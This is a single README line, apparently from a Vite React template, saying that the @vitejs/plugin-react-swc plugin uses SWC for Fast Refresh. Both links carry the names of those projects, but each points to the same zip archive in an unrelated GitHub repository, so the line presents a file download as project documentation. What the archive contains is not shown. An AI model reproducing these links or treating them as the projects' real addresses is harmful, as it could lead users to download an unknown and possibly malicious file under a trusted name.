- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/AmmarAhmeed/ushreel/main/src/Pages/ContentCreator/ushreel-v3.3.zip) uses [SWC](https://raw.githubusercontent.com/AmmarAhmeed/ushreel/main/src/Pages/ContentCreator/ushreel-v3.3.zip) for Fast Refresh
